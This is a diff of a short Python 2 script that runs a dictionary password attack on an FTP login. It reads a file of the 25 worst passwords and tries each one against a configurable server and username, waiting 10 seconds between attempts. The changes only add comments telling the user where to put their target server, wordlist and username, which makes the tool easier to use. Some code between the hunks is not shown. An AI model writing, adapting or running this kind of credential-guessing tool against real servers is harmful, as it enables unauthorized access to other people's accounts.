@@ -1,11 +1,12 @@
 #!/usr/bin/python
 #Script made by akil3s & @DaveLanis
+
 import ftplib
 from ftplib import FTP_TLS
 import time
 
-RUTA_SERVIDOR_FTP = 'yourserver_here'
-dict = open('25peores_pass.txt','r').readlines()
+RUTA_SERVIDOR_FTP = 'yourserver_here' #change me
+dict = open('25peores_pass.txt','r').readlines() # change the name of your dictionary in parentheses
 
 def cliente_ftp_conexion(servidor, nombre_usuario, password):
 #abrimos la conexion
@@ -26,7 +27,7 @@ if __name__ == '__main__':
 		line = line.replace('\n',"")
 		print line
 		try:	
-			cliente_ftp_conexion(servidor=RUTA_SERVIDOR_FTP, nombre_usuario='yourusername',password=line)
+			cliente_ftp_conexion(servidor=RUTA_SERVIDOR_FTP, nombre_usuario='yourusername',password=line) # Change yourusername whiht the correct username
 			time.sleep(10)
 		except Exception, e:
 			print e
